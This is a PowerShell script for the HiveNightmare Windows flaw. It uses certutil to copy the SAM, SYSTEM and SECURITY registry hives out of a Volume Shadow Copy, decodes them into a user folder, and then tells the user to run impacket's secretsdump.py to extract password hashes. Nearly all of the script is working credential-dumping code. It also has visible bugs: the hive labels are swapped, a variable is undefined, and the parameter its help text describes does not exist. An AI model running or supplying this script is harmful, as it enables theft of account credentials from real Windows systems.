<# 
    .SYNOPSIS
        Script for hivenightmare

    .EXAMPLE
        PS C:\> .\Invoke-HiveNightmare.ps1 -path "c:\"
        
        Dumps the hives from the system's Volume Shadow Copies to C:\.

    .NOTES
        Testing
#>

Write-Host -ForegroundColor green "Dumping and Enconding SAM$i hive..."
certutil -encode "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Users\USER\SAM.B64

Write-Host -ForegroundColor green "Dumping and Enconding SECURITY$i hive..."
certutil -encode "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Users\USER\SYSTEM.B64

Write-Host -ForegroundColor green "Dumping and Enconding SYSTEM$i hive..."
certutil -encode "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\Users\USER\SECURITY.B64

Write-Host -ForegroundColor cyan "Decoding SYSTEM$i hive..."
certutil -decode C:\users\USER\SYSTEM.B64 C:\users\USER\SYSTEM

Write-Host -ForegroundColor cyan "Decoding SAM$i hive..."
certutil -decode C:\users\USER\SAM.B64 C:\users\USER\SAM

Write-Host -ForegroundColor cyan "Decoding SECURITY$i hive..."
certutil -decode C:\users\USER\SECURITY.B64 C:\users\USER\SECURITY

Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor yellow "Please, execute the secretsdump.py (impacket) as shown below to extract all hashes..."
 "python3 secretsdump.py -sam SAM -security SECURITY -system SYSTEM local"
